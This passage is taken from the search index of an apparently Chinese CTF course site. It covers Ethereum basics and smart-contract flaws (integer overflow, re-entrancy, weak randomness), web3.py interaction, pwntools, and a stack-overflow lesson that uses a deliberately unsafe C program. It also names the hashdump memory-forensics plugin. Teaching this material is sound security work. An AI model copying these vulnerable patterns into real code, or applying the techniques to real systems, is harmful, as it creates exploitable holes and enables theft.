<li>\u7528\u6237\u5bc6\u7801\u4fe1\u606f\uff1ahashdump\uff08\u5b58\u7684\u662f\u00a0hash\uff0c\u5f97\u4e0d\u5230\u539f\u5bc6\u7801\uff09</li> <li>\u5176\u4ed6\uff1aeditbox privs iehistory clipboard notepad userassist screenshot</li> </ul> </li> </ul> <p>\u5982\u679c\u5f97\u5230\u52a0\u5bc6\u5377\u7684\u8bdd\u9700\u8981\u901a\u8fc7 cncrypt \u7b49\u8f6f\u4ef6\u6253\u5f00</p>"},{"location":"Courses/ctf/MiscTopic/#_5","title":"\u4ee5\u592a\u574a\u533a\u5757\u94fe\u57fa\u7840","text":""},{"location":"Courses/ctf/MiscTopic/#_6","title":"\u4ee5\u592a\u574a\u6a21\u578b","text":"<ul> <li>\u6bcf\u4e2a\u533a\u5757\u5305\u542b\u4e09\u9897\u00a0Merkle\u00a0\u6811\u6839\u8282\u70b9<ul> <li><code>stateRoot</code>\u00a0\u5373\u4e16\u754c\u72b6\u6001\u6811\u6839\u8282\u70b9\uff0c\u72b6\u6001\u662f\u4e00\u7ec4\u7528\u6237\u72b6\u6001\u7684\u7ec4\u5408</li> </ul> </li> <li>\u533a\u5757\u7531\u201c\u77ff\u5de5\u201d\u6216\u201c\u9a8c\u8bc1\u8005\u201d\u5c06\u4ea4\u6613\u6253\u5305\u5f62\u6210\uff0c\u540e\u5e7f\u64ad\u5230\u7f51\u7edc\u4e2d<ul> <li>\u6bcf\u6761\u4ea4\u6613\u4f1a\u5f15\u53d1\u4e16\u754c\u72b6\u6001\u7684\u8f6c\u53d8\uff0c\u6d88\u8017\u4e00\u5b9a\u00a0gas</li> </ul> </li> </ul> <ul> <li>\u516c\u5f00\u94fe\uff1a\u771f\u5b9e\u7684\u4ea4\u6613<ul> <li>\u901a\u8fc7\u00a0https://etherscan.io/\u00a0\u67e5\u770b</li> <li>\u4e3b\u7f51\uff08mainnet\uff09\uff1a\u771f\u6b63\u7684\u91d1\u94b1\u4ea4\u6613\uff0c\u5f88\u5c11\u4f7f\u7528</li> <li>\u6d4b\u8bd5\u94fe\uff1aSepolia / Holesky\u00a0\u94fe\uff0c\u53ef\u4ee5\u901a\u8fc7\u00a0faucet\u00a0\u83b7\u53d6\u514d\u8d39\u4ee3\u5e01<ul> <li>https://sepolia-faucet.pk910.de/</li> <li>Ethernaut\u00a0\u7b49\u5927\u578b\u516c\u5f00\u5408\u7ea6\u00a0CTF\u00a0\u5e73\u53f0\u4f1a\u4f7f\u7528</li> </ul> </li> </ul> </li> <li>\u79c1\u94fe\uff1a\u81ea\u5df1\u642d\u5efa\u7684\u94fe\uff0c\u6a21\u62df\u771f\u5b9e\u7684\u94fe<ul> <li>\u4e00\u822c\u00a0CTF\u00a0\u9898\u76ee\u90fd\u4f7f\u7528\u79c1\u94fe\u90e8\u7f72</li> <li>\u53ef\u4ee5\u901a\u8fc7\u00a0geth\u00a0\u7b49\u5de5\u5177\u90e8\u7f72\u79c1\u94fe</li> </ul> </li> </ul>"},{"location":"Courses/ctf/MiscTopic/#_7","title":"\u8d26\u6237","text":"<ul> <li>\u5916\u90e8\u8d26\u6237\uff08Externally Owned Account\uff09<ul> <li>\u6709\u4e00\u5bf9\u516c\u79c1\u94a5\uff0c\u7528\u4e8e\u7b7e\u7f72\u4ea4\u6613<ul> <li>\u79c1\u94a5\u662f\u968f\u673a\u751f\u6210\u7684\u00a0256\u00a0\u4f4d\u6570\uff0832\u00a0\u5b57\u8282\uff09</li> <li>\u516c\u94a5\u7531\u79c1\u94a5\u7ecf\u8fc7\u00a0ECDSA\u00a0\u7b97\u6cd5\u8ba1\u7b97\u800c\u6765\uff0c\u662f\u4e00\u4e2a\u00a064\u00a0\u5b57\u8282\u7684\u6570</li> <li>\u5730\u5740\u7531\u516c\u94a5\u7ecf\u8fc7\u00a0Keccak-256\u00a0\u54c8\u5e0c\u540e\u53d6\u524d\u00a020\u00a0\u5b57\u8282\u5f97\u5230</li> </ul> </li> </ul> </li> </ul> <p>\u5b89\u5168\u6027</p> <p>privatekey \u548c publickey \u90fd\u662f\u79c1\u5bc6\u7684\uff0c\u53ea\u6709 address \u662f\u516c\u5f00\u7684 </p> <ul> <li>\u5408\u7ea6\u8d26\u6237\uff08Contract Account\uff09<ul> <li>\u7531\u00a0EOA\u00a0\u901a\u8fc7\u4ea4\u6613\u521b\u5efa\u7684\u8d26\u6237\uff0c\u5176\u4e2d\u5305\u542b\u5408\u7ea6\u4ee3\u7801</li> <li>\u5408\u7ea6\u53ef\u4ee5\u5b58\u50a8\u3001\u62e5\u6709\u4ee5\u592a\u5e01</li> <li>\u5411\u5408\u7ea6\u8d26\u6237\u53d1\u9001\u4ea4\u6613\u76f8\u5f53\u4e8e\u8c03\u7528\u5408\u7ea6\u4e2d\u7684\u51fd\u6570</li> <li>\u5408\u7ea6\u672c\u8eab\u4e0d\u80fd\u4e3b\u52a8\u53d1\u8d77\u4ea4\u6613\uff0c\u4f46\u53ef\u4ee5\u5728\u88ab\u8c03\u7528\u65f6\u5411\u5916\u53d1\u9001\u4ea4\u6613</li> </ul> </li> </ul>"},{"location":"Courses/ctf/MiscTopic/#_8","title":"\u4ea4\u6613","text":"<ul> <li>\u6bcf\u4e00\u6761\u4ea4\u6613\u90fd\u4f1a\u5f15\u8d77\u72b6\u6001\u7684\u6539\u53d8</li> <li>\u591a\u4e2a\u4ea4\u6613\u6253\u5305\u5230\u4e00\u8d77\uff0c\u6700\u7ec8\u72b6\u6001\u5c31\u662f\u65b0\u533a\u5757\u5b58\u50a8\u7684\u72b6\u6001</li> <li>\u4ea4\u6613\u4fe1\u606f\u4e2d\u5305\u542b\u00a0hash/v/r/s\u00a0\u4e3a\u4ea4\u6613\u7b7e\u540d\uff0c\u7528\u4e8e\u9a8c\u8bc1\u4ea4\u6613\u7684\u5408\u6cd5\u6027</li> <li>\u5408\u7ea6\u5728\u00a0EVM\u00a0\u4e0a\u6267\u884c\uff0c\u6267\u884c\u8fc7\u7a0b\u4e2d\u4e5f\u6709\u5404\u79cd\u6f0f\u6d1e</li> </ul> <p>EVM\u00a0\u662f\u4e00\u4e2a\u6808\u7ed3\u6784\u7684\u865a\u62df\u673a (Ethereum Virtual Machine)</p> <ul> <li>\u4e00\u6761\u4ea4\u6613\u5305\u542b\u4ee5\u4e0b\u5185\u5bb9\uff1a<ul> <li>from\uff1a\u4ea4\u6613\u53d1\u9001\u8005\u5730\u5740</li> <li>to\uff1a\u4ea4\u6613\u63a5\u6536\u8005\u5730\u5740\uff0c\u5982\u679c\u4e3a\u7a7a\u5219\u8868\u793a\u662f\u5728\u521b\u5efa\u667a\u80fd\u5408\u7ea6</li> <li>value\uff1a\u4ea4\u6613\u91d1\u989d\uff0c\u5373\u53d1\u9001\u65b9\u8981\u7ed9\u63a5\u6536\u65b9\u8f6c\u79fb\u7684\u4ee5\u592a\u5e01\u6570\u91cf\uff08wei\u00a0\u4e3a\u5355\u4f4d\uff09</li> <li>data\uff1a\u4ea4\u6613\u6570\u636e\uff0c\u5982\u679c\u662f\u521b\u5efa\u667a\u80fd\u5408\u7ea6\u5219\u662f\u667a\u80fd\u5408\u7ea6\u4ee3\u7801\uff0c\u5982\u679c\u662f\u8c03\u7528\u667a\u80fd\u5408\u7ea6\u5219\u662f\u8c03\u7528\u7684\u51fd\u6570\u540d\u548c\u53c2\u6570</li> <li>gasPrice\uff1a\u4ea4\u6613\u7684\u00a0gas\u00a0\u4ef7\u683c\uff0c\u5373\u6bcf\u5355\u4f4d\u00a0gas\u00a0\u7684\u4ef7\u683c\uff08wei\u00a0\u4e3a\u5355\u4f4d\uff09</li> <li>gasLimit\uff1a\u4ea4\u6613\u7684\u00a0gas\u00a0\u4e0a\u9650\uff0c\u5373\u4ea4\u6613\u5141\u8bb8\u6267\u884c\u7684\u6700\u5927\u00a0gas\u00a0\u6570\u91cf</li> <li>nonce\uff1a\u4ea4\u6613\u7684\u5e8f\u53f7\uff0c\u5373\u53d1\u9001\u8005\u5df2\u7ecf\u53d1\u9001\u7684\u4ea4\u6613\u6570\u91cf</li> </ul> </li> <li>\u9664\u6b64\u4e4b\u5916\u53d1\u9001\u7684\u4ea4\u6613\u6570\u636e\u5305\u8fd8\u9700\u8981\u5305\u542b\uff1a<ul> <li>hash\uff1a\u4ea4\u6613\u7684\u54c8\u5e0c\u503c\uff0c\u7531\u524d\u9762\u7684\u5185\u5bb9\u548c\u00a0chainId\u00a0\u8ba1\u7b97\u5f97\u5230</li> <li>v\u3001r\u3001s\uff1a\u4ea4\u6613\u7b7e\u540d\u7684\u4e09\u4e2a\u90e8\u5206\uff0c\u7531\u53d1\u9001\u8005\u79c1\u94a5\u5bf9\u4ea4\u6613\u54c8\u5e0c\u503c\u8fdb\u884c\u7b7e\u540d\u5f97\u5230</li> </ul> </li> </ul> <p>\u4ee5\u592a\u5e01\u5355\u4f4d\u6362\u7b97\u7f51\u7ad9\uff1a Ethereum Unit Converter</p> <p>\u4ee5\u592a\u574a\u7684\u4ea4\u6613\u53ef\u4ee5\u5206\u4e3a\u4e09\u79cd\u573a\u666f\uff1a</p> <ul> <li>\u8f6c\u8d26\u4ea4\u6613\uff1a\u4ece\u4e00\u4e2a\u8d26\u6237\u5411\u53e6\u4e00\u4e2a\u8d26\u6237\u53d1\u9001\u4ee5\u592a\u5e01<ul> <li>\u5fc5\u987b\u8981\u6307\u5b9a\u00a0from\u3001to\u3001value\uff0c\u5206\u522b\u8868\u793a\u53d1\u9001\u8005\u3001\u63a5\u6536\u8005\u3001\u8f6c\u79fb\u7684\u4ee5\u592a\u5e01\u6570\u91cf\uff08\u5176\u5b83\u5b57\u6bb5\u6709\u9ed8\u8ba4\u503c\uff09</li> <li>\u4ea4\u6613\u6570\u636e\u5305\u4e2d\u7684\u00a0data\u00a0\u4e3a\u7a7a</li> <li>\u63a5\u6536\u65b9\u53ef\u4ee5\u662f\u00a0EOA\u00a0\u4e5f\u53ef\u4ee5\u662f\u5408\u7ea6\u8d26\u6237</li> </ul> </li> <li>\u521b\u5efa\u5408\u7ea6\u4ea4\u6613\uff1a\u521b\u5efa\u4e00\u4e2a\u5408\u7ea6\u8d26\u6237\uff08\u5c06\u5408\u7ea6\u90e8\u7f72\u5230\u94fe\u4e0a\uff09<ul> <li>\u5fc5\u987b\u8981\u6307\u5b9a\u00a0from\u3001data\uff0c\u5206\u522b\u8868\u793a\u53d1\u9001\u8005\u3001\u5408\u7ea6\u4ee3\u7801\uff08\u7f16\u8bd1\u540e\u7684\u5b57\u8282\u7801\uff09</li> <li>\u4ea4\u6613\u6570\u636e\u5305\u4e2d\u7684\u00a0to\u00a0\u4e3a\u7a7a</li> </ul> </li> <li>\u8c03\u7528\u5408\u7ea6\u4ea4\u6613\uff1a\u8c03\u7528\u4e00\u4e2a\u5408\u7ea6\u8d26\u6237\u7684\u51fd\u6570<ul> <li>\u5fc5\u987b\u8981\u6307\u5b9a\u00a0from\u3001to\u3001data\uff0c\u5206\u522b\u8868\u793a\u53d1\u9001\u8005\u3001\u63a5\u6536\u8005\u3001\u8c03\u7528\u7684\u4fe1\u606f</li> <li>data\u00a0\u5b57\u6bb5\u662f\u7f16\u7801\u540e\u7684\u51fd\u6570\u540d\uff08\u9009\u62e9\u5b50\uff09\u548c\u53c2\u6570</li> </ul> </li> </ul>"},{"location":"Courses/ctf/MiscTopic/#_9","title":"\u667a\u80fd\u5408\u7ea6\u5b89\u5168","text":"<p>Solidity\u00a0\u8bed\u8a00\u662f\u4ee5\u592a\u574a\u5b98\u65b9\u7684\u7f16\u5199\u667a\u80fd\u5408\u7ea6\u7684\u8bed\u8a00</p> <ul> <li>IDE\uff1ahttps://remix.ethereum.org/</li> <li>\u901a\u8fc7\u00a0contract\u00a0\u5173\u952e\u5b57\u58f0\u660e\u4e00\u4e2a\u5408\u7ea6</li> <li>\u901a\u8fc7\u00a0function\u00a0\u5b9a\u4e49\u4e00\u4e2a\u53ef\u4ee5\u8c03\u7528\u7684\u51fd\u6570<ul> <li>public\u3001internal\u3001external\u3001private</li> <li>\u5c5e\u6027\uff08\u72b6\u6001\uff09\u4f1a\u81ea\u52a8\u521b\u5efa\u00a0getter\u00a0\u51fd\u6570</li> <li>\u901a\u8fc7\u00a0view\u3001pure\u00a0\u5173\u952e\u5b57\u5b9a\u4e49\u4e00\u4e2a\u4e0d\u6539\u53d8\u72b6\u6001\u7684\u51fd\u6570</li> </ul> </li> <li>\u901a\u8fc7\u00a0payable\u00a0\u5173\u952e\u5b57\u5b9a\u4e49\u4e00\u4e2a\u53ef\u4ee5\u63a5\u6536\u4ee5\u592a\u5e01\u7684\u51fd\u6570</li> <li>\u7279\u6b8a\u51fd\u6570\uff1aconstructor\u3001fallback\u3001receive</li> </ul> <p>TonyCrane\u7684Solidity\u7b14\u8bb0</p>"},{"location":"Courses/ctf/MiscTopic/#_10","title":"\u5e38\u89c1\u6f0f\u6d1e \u4e4b \u6574\u578b\u6ea2\u51fa","text":"<p>Ethernaut\u00a0\u7684\u9898\u76ee\u00a0<code>Token</code>\uff1a</p> <pre><code>mapping(address =&gt; uint256) balances; \nfunction transfer(address _to, uint256 _value) public returns (bool) { \n    require(balances[msg.sender] - _value &gt;= 0);\n    balances[msg.sender] -= _value; balances[_to] += _value;\n    return true; \n}\n</code></pre> <ul> <li>balances\u00a0\u5b57\u5178\u662f\u00a0uint256\uff0c\u65e0\u7b26\u53f7\u51cf\u6cd5\u6709\u6ea2\u51fa\u98ce\u9669</li> <li>\u7ed9\u4efb\u610f\u5730\u5740\u8f6c\u8d26\uff0c\u539f\u4f59\u989d\u00a020 Token\uff0c\u8f6c\u00a021\u00a0\u4e2a\uff0c\u5219\u00a0balances\u00a0\u4f1a\u53d8\u7684\u5de8\u5927</li> <li>\u901a\u8fc7\u4e8b\u5148\u68c0\u67e5\u6216\u8005\u4f7f\u7528\u00a0SafeMath\u00a0\u5e93\u53ef\u4ee5\u907f\u514d</li> <li>\u65b0\u7248\u672c\u00a0solidity\u00a0\u81ea\u52a8\u5f00\u542f\u4e86\u6ea2\u51fa\u68c0\u67e5</li> </ul>"},{"location":"Courses/ctf/MiscTopic/#_11","title":"\u5e38\u89c1\u6f0f\u6d1e \u4e4b \u91cd\u5165\u653b\u51fb","text":"<p>Ethernaut\u00a0\u7684\u9898\u76ee\u00a0<code>Re-entrancy</code>\uff0c\u5f88\u7ecf\u5178\u7684\u667a\u80fd\u5408\u7ea6\u6f0f\u6d1e</p> <pre><code>contract Bank { \n    mapping(address =&gt; uint256) balances; \n    ... \n    function withdraw(uint256 amount) public { \n        require(balances[msg.sender] &gt;= amount); \n        msg.sender.call.value(amount)(\"\"); \n        balances[msg.sender] -= amount; \n    } \n}\n</code></pre> <ul> <li>withdraw\u00a0\u65f6\u5148\u8f6c\u94b1\u518d\u66f4\u65b0\u00a0balances</li> <li>\u8f6c\u94b1\u7684\u65f6\u5019\u4f1a\u8fdb\u5165\u5230\u76ee\u6807\u5408\u7ea6\u7684\u00a0fallback\u00a0\u51fd\u6570\uff0c\u53ef\u4ee5\u518d\u6b21\u8c03\u7528\u00a0withdraw</li> <li>\u518d\u6b21\u8c03\u7528\u65f6\u00a0require\u00a0\u68c0\u67e5\u65f6\uff0cbalances\u8fd8\u6ca1\u6709\u66f4\u65b0</li> <li>\u8fd9\u6837\u53ef\u4ee5\u628a\u94b1\u53d6\u7a7a</li> </ul>"},{"location":"Courses/ctf/MiscTopic/#_12","title":"\u5e38\u89c1\u6f0f\u6d1e \u4e4b \u4f2a\u968f\u673a\u6570","text":"<ul> <li>\u533a\u5757\u94fe\u9700\u8981\u6240\u6709\u4ee5\u592a\u574a\u8282\u70b9\u9a8c\u8bc1\u4ea4\u6613\u8ba1\u7b97\u51fa\u76f8\u540c\u7ed3\u679c\u8fbe\u6210\u5171\u8bc6</li> <li>\u65e0\u6cd5\u5b9e\u73b0\u771f\u968f\u673a\u6570</li> <li>\u4f2a\u968f\u673a\u53ef\u4ee5\u7834\u89e3\uff1a<ul> <li>\u5229\u7528\u533a\u5757\u53d8\u91cf\u4f5c\u4e3a\u968f\u673a\u6570\uff1a\u53ef\u4ee5\u83b7\u53d6</li> <li>\u5229\u7528\u00a0blockhash\u00a0\u4f5c\u4e3a\u968f\u673a\u6570\uff1a\u53ea\u4fdd\u7559\u6700\u8fd1\u00a0256\u00a0\u4e2a\u533a\u5757</li> <li>\u56de\u6eda\u653b\u51fb\uff1a\u4e0d\u65ad\u00a0revert\u00a0\u6765\u731c\u968f\u673a\u6570</li> </ul> </li> </ul> <p>Ethernaut\u00a0\u7684\u9898\u76ee\u00a0<code>Coin Flip</code></p> <p>\u8be5\u9898\u76ee\u53ea\u9700\u8981\u6839\u636e\u6e90\u4ee3\u7801\u4e2d\u751f\u6210\u968f\u673a\u6570\u7684\u65b9\u6cd5\u8fdb\u884c\u590d\u73b0\u5373\u53ef\uff0c\u53ef\u4ee5\u85c9\u6b64\u5b66\u4e60 Remix IDE \u4e0e\u6d4b\u8bd5\u94fe\u7684\u4ea4\u4e92 (Beyond The Console)</p>"},{"location":"Courses/ctf/MiscTopic/#ctf","title":"CTF \u6bd4\u8d5b\u4e2d\u7684\u79c1\u94fe\u9898\u76ee\u4ea4\u4e92","text":"<ul> <li>\u4e00\u822c\u4f1a\u8fc7\u6ee4\u6389\u5927\u90e8\u5206\u00a0geth rpc\u00a0\u63a5\u53e3<ul> <li>\u9632\u6b62\u5176\u4ed6\u961f\u4f0d\u6252\u94fe\u8e6d\u8f66\u00a0/\u00a0\u91cd\u653e</li> <li>\u767d\u540d\u5355\u793a\u4f8b\u53ef\u89c1\u00a0chainflag/solidctf\u00a0\u4e2d\u7684\u767d\u540d\u5355\uff0c\u4e00\u822c\u5c31\u662f\u8fd9\u4e9b</li> <li>geth\u00a0\u624b\u52a8\u64cd\u4f5c\u5f88\u590d\u6742\uff08\u53ea\u80fd\u53d1\u00a0raw\uff09\uff0cremix/metamask\u00a0\u53ef\u80fd\u4f1a\u65e0\u6cd5\u8fde\u63a5</li> </ul> </li> <li>\u53ef\u4ee5\u00a0/\u00a0\u63a8\u8350\u901a\u8fc7\u00a0web3.py\u00a0\u8fdb\u884c\u4ea4\u4e92<ul> <li>\u901a\u8fc7\u00a0eth.contract\u00a0\u548c\u00a0abi\u00a0\u4e0e\u00a0addr/bytecode\u00a0\u521b\u5efa\u5408\u7ea6\u5bf9\u8c61</li> <li>\u901a\u8fc7\u00a0contract.functions.f().build_transaction()\u00a0\u6784\u5efa\u4ea4\u6613</li> <li>\u901a\u8fc7\u00a0eth.account.sign_transaction(txn, privateKey)\u00a0\u7b7e\u540d</li> <li>\u5f97\u5230\u00a0rawTransaction\u00a0\u540e\u00a0eth.send_raw_transaction(raw)\u00a0\u53d1\u9001</li> <li>\u901a\u8fc7\u00a0eth.wait_for_transaction_receipt(hash)\u00a0\u7b49\u5f85\u4ea4\u6613\u5b8c\u6210</li> <li>\u65e0\u9700\u4ea4\u6613\u7684\u00a0view\u00a0\u51fd\u6570\u53ef\u4ee5\u76f4\u63a5\u00a0contract.functions.f().call()</li> </ul> </li> </ul>"},{"location":"Courses/ctf/MiscTopic/#web3py","title":"Web3.py \u4ea4\u4e92","text":"<p>\u975e\u5e38\u63a8\u8350\u4f7f\u7528 <code>Web3.py</code> \u8fdb\u884c\u4ea4\u4e92\uff0c\u4ee5\u67d0 Lab \u4e00\u4e2a\u9898\u76ee\u7684\u4ee3\u7801\u4e3a\u4f8b\u5b50\uff1a</p> <ul> <li>\u521b\u6377\u5408\u7ea6\u5b9e\u4f8b<ul> <li><code>SimpleStorage = w3.eth.contract(abi=contract_abi, bytecode=contract_bytecode)</code></li> </ul> </li> <li>\u6784\u5efa\u90e8\u7f72\u4ea4\u6613 <pre><code>    transaction = SimpleStorage.constructor().build_transaction({\n    \u00a0 \u00a0 'from': Account,\n    \u00a0 \u00a0 'nonce': w3.eth.get_transaction_count(Account),\n    \u00a0 \u00a0 'gas': 2000000,\n    \u00a0 \u00a0 'gasPrice': w3.to_wei('50', 'gwei')\n    })\n</code></pre></li> <li>\u79c1\u94a5\u7b7e\u540d<ul> <li><code>signed_txn = w3.eth.account.sign_transaction(transaction, privateKey)</code></li> </ul> </li> <li>\u53d1\u9001\u4ea4\u6613\u3001\u83b7\u53d6\u4ea4\u6613\u56de\u6267<ul> <li><code>txn_hash = w3.eth.send_raw_transaction(signed_txn.rawTransaction)</code></li> <li><code>txn_receipt = w3.eth.wait_for_transaction_receipt(txn_hash)</code></li> </ul> </li> <li>\u83b7\u53d6\u5408\u7ea6\u5730\u5740<ul> <li><code>contract_address = txn_receipt.contractAddress</code></li> </ul> </li> <li>\u521b\u6377\u5df2\u90e8\u7f72\u5408\u7ea6\u7684\u5b9e\u4f8b<ul> <li><code>simple_storage = w3.eth.contract(address=contract_address, abi=contract_abi)</code></li> </ul> </li> <li>\u6784\u5efa geteth() \u51fd\u6570<ul> <li>\u8981\u8bb0\u5f97\u52a0 `value: w3.to_wei(0.001,'ether') <pre><code>    set_txn = simple_storage.functions.geteth().build_transaction({\n        'from': Account,\n        'value': w3.to_wei(0.001, 'ether'),\n        'nonce': w3.eth.get_transaction_count(Account),\n        'gas': 200000,\n        'gasPrice': w3.to_wei('50', 'gwei')\n    })\n</code></pre></li> </ul> </li> <li>\u8c03\u7528 geteth() \u51fd\u6570<ul> <li><code>stored_data = simple_storage.functions.geteth().call()</code></li> </ul> </li> </ul>"},{"location":"Courses/ctf/Pwn/","title":"Pwn \u57fa\u7840","text":""},{"location":"Courses/ctf/Pwn/#pwb","title":"Pwb \u57fa\u7840","text":"<p> \u7ea6 1232 \u4e2a\u5b57  106 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 7 \u5206\u949f</p>"},{"location":"Courses/ctf/Pwn/#pwntools","title":"Pwntools\u4ea4\u4e92","text":"<ul> <li>\u5b89\u88c5\uff1a<ul> <li><code>pip install pwntools</code></li> </ul> </li> <li>\u5bfc\u5165\uff1a<ul> <li><code>from pwn import *</code></li> </ul> </li> <li>\u8fde\u63a5\u53ef\u6267\u884c\u6587\u4ef6(\u6216shell\u547d\u4ee4)<ul> <li><code>p = process(./crackme.elf)</code></li> <li><code>p = process(['nc','127.0.0.1','0721'])</code></li> </ul> </li> <li>\u8bbe\u7f6e\u73af\u5883<ul> <li><code>context.log_level = 'DEBUG'</code> \u5f00\u542fdebug\u6a21\u5f0f</li> <li><code>context.arch = 'amd64'</code> 32\u4f4d\u4fee\u6539\u6210\u522b\u7684 (\u5982 i386)</li> </ul> </li> <li>\u53d1\u9001<ul> <li><code>p.sendafter(b\"what's your name: \\n\", b'Nimisora')</code> \u9700\u8981\u65f6 byte \u6d41\u5f62\u5f0f</li> </ul> </li> <li>\u6682\u505c<ul> <li><code>pause()</code></li> </ul> </li> <li>\u4ea4\u4e92\u6a21\u5f0f<ul> <li><code>p.interactive()</code></li> </ul> </li> </ul>"},{"location":"Courses/ctf/Pwn/#shellcode","title":"\u6808\u6ea2\u51fa &amp; SHELLCODE","text":"<p>\u4e86\u89e3StackOverflow\uff0c\u76f8\u4fe1\u4f60\u5c31\u77e5\u9053\u4e3a\u4ec0\u4e48\u8981\u614e\u7528gets\u548cscanf\u8bfb\u53d6\u8f93\u5165\u4e86</p>"},{"location":"Courses/ctf/Pwn/#_1","title":"\u7ecf\u5178\u7684\u6808\u6ea2\u51fa\u653b\u51fb","text":"<p>\u4e00\u4e2a\u4f3c\u4e4e\u6ca1\u6709\u4ec0\u4e48\u95ee\u9898\u7684\u7b80\u5355\u4ea4\u4e92\u7a0b\u5e8f\uff1a</p> <pre><code>#include &lt;stdio.h&gt;\n\nint main() {\n    char name[64];\n    printf(\"What's your name?\");\n    scanf(\"%s\", name);\n    printf(\"Hello, %s!\\n\", name);\n    return 0;\n}\n</code></pre> <p>\u5c06\u5176\u53e6\u5b58\u4e3a <code>victim.c</code> \uff0c\u7528 gcc \u7f16\u8bd1\u5e76\u8fd0\u884c\uff1a</p> <pre><code>$ gcc victim.c -o victim -g\n$ ./victim \nWhat's your name?Jack\nHello, Jack!\n</code></pre> <p>\u4e0a\u9762\u7684\u7f16\u8bd1\u9009\u9879\u4e2d <code>-g</code> \u8868\u793a\u8f93\u51fa\u8c03\u8bd5\u4fe1\u606f\u3002</p> <p>\u8fd9\u6bb5\u7a0b\u5e8f\u58f0\u660e\u4e86\u4e00\u4e2a\u957f\u5ea6\u4e3a 64 \u7684\u5b57\u8282\u578b\u6570\u7ec4\uff0c\u7136\u540e\u6253\u5370\u63d0\u793a\u4fe1\u606f\uff0c\u518d\u8bfb\u53d6\u7528\u6237\u8f93\u5165\u7684\u540d\u5b57\uff0c\u6700\u540e\u8f93\u51fa Hello \u548c\u7528\u6237\u8f93\u5165\u7684\u540d\u5b57\u3002\u4ee3\u7801\u4f3c\u4e4e\u6ca1\u4ec0\u4e48\u95ee\u9898\uff0c name \u6570\u7ec4 64 \u4e2a\u5b57\u8282\u5e94\u8be5\u662f\u591f\u4e86\u5427\uff1f\u6bd5\u7adf\u6ca1\u4eba\u7684\u59d3\u540d\u4f1a\u6709 64 \u4e2a\u5b57\u6bcd\uff0c\u6bd5\u7adf\u6211\u4eec\u7684\u5185\u5b58\u7a7a\u95f4\u4e5f\u662f\u6709\u9650\u7684\u3002</p> <p>\u4f46\u662f\uff0c\u5f80\u574f\u5904\u60f3\u4e00\u60f3\uff0c\u6ca1\u4eba\u80fd\u963b\u6b62\u7528\u6237\u5728\u7ec8\u7aef\u8f93\u5165 100 \u751a\u81f3 1000 \u4e2a\u7684\u5b57\u7b26\uff0c\u5f53\u90a3\u79cd\u60c5\u51b5\u53d1\u751f\u65f6\uff0c\u4f1a\u53d1\u751f\u4ec0\u4e48\u4e8b\u60c5\uff1f</p> <p>name \u6570\u7ec4\u53ea\u6709 64 \u4e2a\u5b57\u8282\u7684\u7a7a\u95f4\uff0c\u90a3\u4e9b\u591a\u4f59\u7684\u5b57\u7b26\u5462\uff0c\u4f1a\u5230\u54ea\u91cc\u53bb\uff1f</p> <p>\u591a\u51fa\u7684\u5b57\u7b26\u5411\u6808\u5e95\u90e8\u6ea2\u51fa</p> <p>\u4e3a\u4e86\u56de\u7b54\u8fd9\u4e24\u4e2a\u95ee\u9898\uff0c\u9700\u8981\u4e86\u89e3\u7a0b\u5e8f\u8fd0\u884c\u65f6 name \u6570\u7ec4\u662f\u5982\u4f55\u4fdd\u5b58\u5728\u5185\u5b58\u4e2d\u7684\uff0c\u8fd9\u662f\u4e00\u4e2a\u5c40\u90e8\u53d8\u91cf\uff0c\u663e\u7136\u5e94\u8be5\u4fdd\u5b58\u5728\u6808\u4e0a\uff0c\u90a3\u6808\u4e0a\u7684\u5e03\u5c40\u53c8\u662f\u600e\u6837\u7684\uff1f\u8ba9\u6211\u4eec\u6765\u5206\u6790\u4e00\u4e0b\u7a0b\u5e8f\u4e2d\u7684\u6c47\u7f16\u6307\u4ee4\u5427\uff0c\u5148\u5c06\u76ee\u6807\u7a0b\u5e8f\u7684\u6c47\u7f16\u7801\u8f93\u51fa\u5230 victim.asm \u6587\u4ef6\u4e2d\uff0c\u547d\u4ee4\u5982\u4e0b\uff1a</p> <pre><code>objdump -d victim -M intel &gt; victim.asm\n</code></pre> <p>\u7136\u540e\u6253\u5f00 victim.asm \u6587\u4ef6\uff0c\u627e\u5230\u5176\u4e2d\u7684 main \u51fd\u6570\u7684\u4ee3\u7801\uff1a</p> <pre><code>0000000000400576 &lt;main&gt;:\n  400576:   55                      push   rbp\n  400577:   48 89 e5                mov    rbp,rsp\n  40057a:   48 83 ec 40             sub    rsp,0x40\n  40057e:   bf 44 06 40 00          mov    edi,0x400644\n  400583:   b8 00 00 00 00          mov    eax,0x0\n  400588:   e8 b3 fe ff ff          call   400440 &lt;printf@plt&gt;\n  40058d:   48 8d 45 c0             lea    rax,[rbp-0x40]\n  400591:   48 89 c6                mov    rsi,rax\n  400594:   bf 56 06 40 00          mov    edi,0x400656\n  400599:   b8 00 00 00 00          mov    eax,0x0\n  40059e:   e8 cd fe ff ff          call   400470 &lt;__isoc99_scanf@plt&gt;\n  4005a3:   48 8d 45 c0             lea    rax,[rbp-0x40]\n  4005a7:   48 89 c6                mov    rsi,rax\n  4005aa:   bf 59 06 40 00          mov    edi,0x400659\n  4005af:   b8 00 00 00 00          mov    eax,0x0\n  4005b4:   e8 87 fe ff ff          call   400440 &lt;printf@plt&gt;\n  4005b9:   b8 00 00 00 00          mov    eax,0x0\n  4005be:   c9                      leaved\n  4005bf:   c3                      ret\n</code></pre> <p>\u8be5\u51fd\u6570\u7684\u5f00\u5934\u7684\u00a0push rbp; mov rbp, rsp; sub rsp, 0x40\u00a0\uff0c\u5148\u4fdd\u5b58 rbp \u7684\u6570\u503c\uff0c\u518d\u4ee4 rbp \u7b49\u4e8e rsp \uff0c\u7136\u540e\u5c06\u6808\u9876\u6307\u9488 rsp \u51cf\u5c0f 0x40 \uff08\u4e5f\u5c31\u662f 64 \uff09\uff0c\u76f8\u5f53\u4e8e\u5728\u6808\u4e0a\u5206\u914d\u957f\u5ea6\u4e3a 64 \u7684\u7a7a\u95f4</p> <p>main \u51fd\u6570\u4e2d\u53ea\u6709 name \u4e00\u4e2a\u5c40\u90e8\u53d8\u91cf\uff0c\u663e\u7136\u8fd9\u6bb5\u7a7a\u95f4\u5c31\u662f name \u6570\u7ec4\uff0c\u5373 name \u7684\u8d77\u59cb\u5730\u5740\u4e3a\u00a0rbp-0x40\u00a0\u3002\u518d\u7ed3\u5408\u51fd\u6570\u7ed3\u5c3e\u7684\u00a0leave; ret\u00a0\uff0c\u540c\u65f6\u7c7b\u6bd4\u4e00\u4e0b 32 